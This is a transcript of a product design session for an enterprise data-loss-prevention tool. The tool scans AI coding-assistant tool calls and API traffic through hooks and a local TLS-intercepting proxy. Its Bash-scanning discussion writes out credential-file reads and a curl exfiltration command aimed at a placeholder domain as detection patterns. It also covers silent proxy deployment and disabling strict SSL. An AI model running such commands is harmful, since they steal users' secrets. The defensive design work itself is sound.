# mykka-guard Design Session
**Date:** June 12, 2026 (evening)  
**Attendees:** Marcus Webb (CTO), Yuki Tanaka (Extension Engineer), Ben Cho (PM)  
**Goal:** Sharpen mykka-guard — hooks mode and proxy mode — to a spec ready for implementation planning.  
**Input:** Previous meeting conclusions: MCP killed, Claude Code hooks are the correct zero-token approach, local proxy covers everything else.

---

## Transcript

---

**MARCUS:** Before we go wide, I want to nail three technical constraints that everything else has to fit inside. One: sub-15ms latency per hook invocation. Developers feel latency on every tool call. If mykka-guard adds 100ms to every file read, it's gone within a week. Two: works fully offline with cached policy — no internet, no change in behavior. Three: one binary, two modes, no separate install. If a developer has to install different packages for hooks mode versus proxy mode, they won't.

---

**YUKI:** Sub-15ms is achievable. I checked the detection engine — `engine.ts` has no browser dependencies. `crypto.subtle` is native in Node 18+ and Bun. `performance.now()` is native. All the pattern matching, entropy, dictionary lookups — pure TS computation. The only startup cost for a Bun-compiled binary is loading the policy JSON from disk. On a warm filesystem that's 2-3ms. Detection on a 10KB file: under 5ms measured. We're well inside 15ms.

---

**MARCUS:** Good. So the binary architecture is: Bun compile to a single native executable. `bun build --compile --target=bun-windows-x64` and equivalents for macOS arm64, macOS x64, Linux x64. Four artifacts, one release. CI builds all four.

---

**BEN:** Before we go technical — can someone walk me through the full user journey for hooks mode? I need to write the user story.

---

**MARCUS:** Developer installs mykka-guard. They run `mykka-guard login` — browser opens, they authenticate via Clerk (same account as pretzel-console), token stored in `~/.mykka/token`. Done. Then `mykka-guard setup --claude-code` — this reads their existing `~/.claude/settings.json` (or creates it), and appends the hook entries for `PreToolUse` and `PostToolUse`. From that point forward, every Claude Code tool call goes through the guard. Nothing else to configure.

---

**YUKI:** There's a nuance on the `setup` command. `~/.claude/settings.json` is per-user global, but Claude Code also supports per-project `.claude/settings.json`. The `setup` command should default to global but offer `--project` to scope it to the current directory. An admin deploying for 50 devs wants global. A developer testing it wants project-scoped first.

---

**MARCUS:** Noted. Write that as a flag: `mykka-guard setup --claude-code [--scope=global|project]`. Default: global.

---

**BEN:** What does the settings.json injection actually look like? I need to put the exact format in the spec.

---

**MARCUS:** 

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": ".*",
        "hooks": [{ "type": "command", "command": "mykka-guard hook --event pre" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Read|Write|Edit|MultiEdit",
        "hooks": [{ "type": "command", "command": "mykka-guard hook --event post" }]
      }
    ]
  }
}
```

The `setup` command merges this into whatever's already in `settings.json` — it does not overwrite the whole file.

---

**YUKI:** Wait — I want to push on the hook events. `PreToolUse` with a broad `.*` matcher fires on every single tool call including things like `TodoWrite` and `LS`. We're doing work for every tool invocation, even ones that can't contain sensitive data. That's unnecessary CPU and latency.

---

**MARCUS:** You're right. Narrow the matchers:

- `PreToolUse` matcher: `Read|Write|Edit|MultiEdit|Bash|WebFetch`
- `PostToolUse` matcher: `Read` only

Reasoning: for `Write`, `Edit`, `MultiEdit` we check the content *before* it's written — that's PreToolUse. For `Read`, we can only see the file content *after* Claude Code reads it — that's PostToolUse. For `Bash`, we check the command string itself in PreToolUse. `WebFetch` in PreToolUse to check for credential-shaped URLs.

---

**YUKI:** One issue with PostToolUse on Read: the file content has already been loaded into the model's context by the time our hook fires. If we return `{"decision":"block"}` from a PostToolUse hook, does Claude Code unload the content?

---

**MARCUS:** That's the question I need to verify against the Claude Code docs. Two scenarios: either PostToolUse block is respected and the content is not passed to the model, or PostToolUse is advisory only and we can only inject a warning. If it's advisory only, we have a problem — we're scanning after the damage is done.

The mitigation: for Read specifically, we move to PreToolUse as well. Hook receives `{tool: "Read", input: {file_path: "..."}}`. The hook itself opens and reads the file, scans it, and returns allow or block *before* Claude Code executes the Read. Yes, we're reading the file twice, but the developer doesn't feel it — both reads are local disk, total cost maybe 3ms extra.

---

**YUKI:** That's the right call. Same file, read twice. Totally acceptable. And it means mykka-guard fully intercepts the content before it ever touches the model context.

---

**BEN:** So the complete hook surface is: PreToolUse on Read (we read the file ourselves + scan), PreToolUse on Write/Edit (scan what's being written), PreToolUse on Bash (scan the command string), PreToolUse on WebFetch (scan the URL and any headers/body). Is that the full blast radius?

---

**ALEXEI:** *(joining 20 minutes late)* Sorry. What did I miss?

---

**MARCUS:** PreToolUse on all meaningful tools. Yuki's summary is right. Add one thing, Alexei: PreToolUse on `Bash` — what specifically do we look for?

---

**ALEXEI:** Three categories. First: credential tokens in command arguments — `curl -H "Authorization: Bearer <token>"`, `git clone https://user:password@...`, `aws --secret-access-key <key>`. Second: credential file reads — `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa`, `openssl pkcs12 -in cert.p12`. Third: exfiltration patterns — `curl https://external-domain.com -d @sensitivefile`. The command string analysis reuses the same pattern rules from the PolicyDoc. We don't need new rule types — a developer's policy already has credential patterns. We just run them against the bash command string instead of a prompt.

---

**MARCUS:** Clean. The detection engine doesn't care what the text source is — it's all just text with rules applied. Bash command string, file content, HTTP request body — same engine, different input.

---

**BEN:** Now I need to understand how the PolicyDoc maps to what mykka-guard actually runs. In the browser extension, `PolicyDoc.subjects[].rules[]` is the compiled policy per member. The subject tells us which rules apply to which user. For mykka-guard, how does the guard know which subject it belongs to?

---

**MARCUS:** Same as the extension. `mykka-guard login` authenticates as a specific user. The `GET /v1/policy` endpoint on the backend compiles the policy for that user — resolving their subject memberships — and returns the compiled rule set. mykka-guard caches it. At enforcement time it just runs the compiled rules. No subject resolution at runtime.

---

**YUKI:** There's one thing that doesn't translate: `ResolvedRule.destinations`. In the browser extension, `destinations` filters which AI sites trigger a rule — "only apply credential rule on chatgpt.com, not on internal tools." For mykka-guard, there's no concept of destination. We're enforcing at the data layer, not the destination layer. The right behavior: ignore `destinations` entirely in mykka-guard. Every rule that applies to the user applies everywhere they use Claude Code.

---

**MARCUS:** Correct for v1. Future enhancement: add a `toolConfigs` section to the PolicyDoc that specifies per-enforcement-client overrides. But that requires a backend change. For now: ignore `destinations` in guard mode, document it as a known limitation.

---

**BEN:** Backend change is also needed to add `clientType` on scan records. How does mykka-guard report violations back to our servers?

---

**MARCUS:** Async, fire-and-forget. The guard makes its allow/block decision synchronously, outputs the result immediately so the hook latency is deterministic, then spawns a background goroutine... sorry, background Bun task... that POSTs the violation event to `POST /v1/scans`. Same endpoint the extension uses, new `clientType: "claude-code-hook"` field in the payload. If the POST fails (offline), we queue it in a local SQLite file and retry later.

---

**YUKI:** SQLite for the queue? That's a dependency.

---

**MARCUS:** Bun ships with SQLite support built-in. `bun:sqlite`. No extra binary. Single file at `~/.mykka/queue.db`. Auto-created, auto-migrated on startup. Violations queue when offline, drain when connection is restored.

---

**BEN:** Good. Now proxy mode. Who's talking through this?

---

**MARCUS:** I'll drive it. The proxy daemon solves a different problem: tools that don't have hooks — Cursor, GitHub Copilot, Python scripts, anything that calls an AI API directly. The approach: a local HTTPS MITM proxy. `mykka-guard daemon start`. Listens on `127.0.0.1:8877`. Generates a local CA on first run, installs to OS trust store.

---

**YUKI:** The trust store installation is the scary part. On macOS it requires `sudo`. Developers hate `sudo` for a DLP tool. Can we avoid it?

---

**MARCUS:** Two paths. Path one: `mykka-guard daemon setup --install-cert` explicitly requests it once. The user understands why — they type their password, it's done. This is exactly how Charles Proxy, mitmproxy, Zscaler, every corporate DLP tool works. It's one-time, it's understood in enterprise contexts. Path two: for environments where the cert can't be trusted (consumer), we can set the proxy address in VS Code / Cursor settings directly — `"http.proxy": "http://127.0.0.1:8877"` — and Cursor uses the proxy for all extension/API traffic without needing the OS trust store.

---

**YUKI:** The VS Code/Cursor settings path is better for DX. The binary runs `setup --cursor` which writes `"http.proxy"` and `"http.proxyStrictSSL": false` into `~/.cursor/settings.json`. No cert trust needed. The downside: only covers Cursor. Command-line tools still need the cert for proper HTTPS.

---

**MARCUS:** So we support both. `mykka-guard daemon setup --cursor` patches Cursor settings only, no cert. `mykka-guard daemon setup --system` installs the cert globally and sets `HTTPS_PROXY` in the shell profile, covering everything.

---

**BEN:** For an enterprise MDM deployment?

---

**MARCUS:** IT pushes the CA cert via Intune or Jamf — that's standard. IT deploys the daemon as a Launch Agent (macOS) or Windows Service. Developers never know it's there. Same as CrowdStrike. The MDM path is the cleanest enterprise story — zero user friction.

---

**ALEXEI:** What does the proxy actually scan? Request body only? Does it need to scan responses?

---

**MARCUS:** Request bodies. The Anthropic API request is JSON: `{ model, messages: [{role, content}] }`. We extract all `content` fields where `role === "user"` and the `system` prompt. Concatenate, run detection. Same engine, same rules. Response scanning is out of scope for v1 — the response is AI-generated text, not user data.

---

**YUKI:** Streaming responses complicate the proxy architecture. AI APIs return SSE streams. Standard HTTPS proxy implementations buffer the full request before forwarding, which is fine. But the response comes back as a stream of `data: {...}` chunks. We don't want to buffer the entire response before delivering it to the client — that adds latency the user will feel. So: buffer and scan the request, stream the response through unchanged.

---

**MARCUS:** Correct. Scan outbound, stream inbound. The scanning happens on the outbound request which is small (prompt text, maybe 50KB at most for context-heavy requests). That's milliseconds. The response stream is not touched.

---

**BEN:** Both modes have the same policy source. Let me make sure I have the pretzel-console changes right:

1. `POST /v1/scans` needs to accept `clientType` field — backend change.
2. New endpoint for non-browser auth token generation: `POST /v1/api-keys` — for CI/CD, git hooks, daemon. Browser extension uses Clerk JWT. CLI and daemon use a long-lived API key.
3. pretzel-console UI: API key management screen under Settings.
4. pretzel-console UI: Coverage Map — per-member, which clients active, last sync.
5. pretzel-console reports: filter violations by `clientType`.

---

**MARCUS:** That's the complete backend surface. One more: the `GET /v1/policy` endpoint currently expects Clerk JWT in the Authorization header. For mykka-guard, we authenticate with an API key (Bearer token format). The backend middleware needs to handle both. That's already partially there since the token model (`ps_live_` prefix tokens) exists — it's just a matter of issuing tokens scoped to a specific user identity.

---

**BEN:** One thing I want to flag from a product standpoint. The hooks mode and proxy mode feel like two separate features right now. But the developer mental model should be: "I installed mykka-guard, I'm protected." They shouldn't have to think about which mode covers which tool. The recommended path for a developer should be: install → login → setup auto, which runs both `--claude-code` and `--cursor` setup automatically, and gives them a coverage summary: "You are now protected for: Claude Code ✅, Cursor ✅. For full OS-level coverage, run setup --system."

---

**MARCUS:** That's the install command design. `mykka-guard install` does everything — detects what AI tools are present, sets up the relevant hooks or proxy config, shows a coverage summary. The individual `setup --claude-code` etc. are advanced flags for manual control.

---

**YUKI:** One last thing: the binary needs to be auto-updatable. Every time Anthropic changes the Claude Code settings format or the hooks API, we need to ship an update fast. `mykka-guard update` checks GitHub releases for a new binary, downloads, replaces itself. Standard self-update pattern.

---

**MARCUS:** Agreed. And the policy sync is already version-gated — the `GET /v1/policy/version` check before downloading a new policy means we don't re-download the policy on every invocation. One version check, fast, then serve from cache. Same pattern the extension uses in `sync.ts`.

---

**BEN:** I have enough to write the spec. Let me summarize what we've decided and see if anyone objects before I go write it.

**mykka-guard hooks mode (Claude Code specific):**
- `PreToolUse` on `Read|Write|Edit|MultiEdit|Bash|WebFetch`
- For `Read`: guard reads file itself, scans content, returns allow/block before Claude Code touches it
- For `Write/Edit`: scans the content being written
- For `Bash`: scans the command string for credential patterns
- Zero tokens, zero model context impact
- PolicyDoc from `GET /v1/policy` with user's API key, ignored `destinations` field in v1
- Violations queued offline via Bun SQLite, drained async

**mykka-guard proxy mode (everything else):**
- Local HTTPS proxy on `127.0.0.1:8877`
- Self-signed CA, installable to OS trust store OR VS Code/Cursor settings.json
- Scan outbound request bodies to AI API endpoints
- Stream responses through unchanged
- Same detection engine, same PolicyDoc

**One binary, `bun build --compile`, 4 platform targets**

**`mykka-guard install` — smart setup command that detects present tools and configures both modes**

**Backend changes:** `clientType` on scans, API key issuance, policy endpoint handles API keys, Coverage Map data endpoint

**pretzel-console changes:** API key management, Coverage Map UI, clientType filter in reports

---

*(No objections.)*

---

**MARCUS:** One more thing before we close. The extraction of `@mykka/detect` is a prerequisite for shipping mykka-guard. Right now `engine.ts` uses `@/` path aliases that are Vite-specific. We need to extract the detection module (engine.ts + all its imports: normalize.ts, code-block.ts, layer1-patterns/, layer3-dictionary/) into a standalone package with proper relative imports, tested independently with Node/Bun test runner, published to npm or our private registry. That package is what mykka-guard imports. The extension also imports it. Single source of truth for detection logic.

---

**YUKI:** I can do the extraction. Two days including tests. The `crypto.subtle` call in engine.ts — fine in Node 18+ and Bun. The `performance.now()` — fine. The only adaptation: the `sha256` function uses `crypto.subtle.digest` which returns a Promise. In Node 18+ this is available on the global `crypto`. I'll verify it works in Bun's environment too, but I expect it does — Bun implements the Web Crypto API.

---

**MARCUS:** Verify and document the minimum runtime: `bun >= 1.0` or `node >= 18`. That goes in the package README.

---

**BEN:** Okay. I'm writing the spec. Target: Monday end of day. Marcus and Yuki review Tuesday. Implementation plan starts Wednesday.

---

*Session ended.*

---

## Decision Log

| Decision | Rationale |
|---|---|
| PreToolUse on Read (guard reads file itself) | PostToolUse is after model context — can't guarantee block effectiveness |
| Narrow tool matchers, not `.*` | Avoid latency on non-sensitive tools (TodoWrite, LS, etc.) |
| Ignore `destinations` field in v1 | No concept of AI destination in file/command context; add `toolConfigs` later |
| Async violation reporting via Bun SQLite queue | Hook latency must be deterministic; never block on network |
| `mykka-guard install` auto-detects and configures | Developer should not need to understand hooks vs proxy |
| Extract `@mykka/detect` as prerequisite | Engine must be portable; currently has Vite-specific path aliases |
| Proxy scans requests only, streams responses | Request = user data (risky); response = AI-generated (safe to stream) |
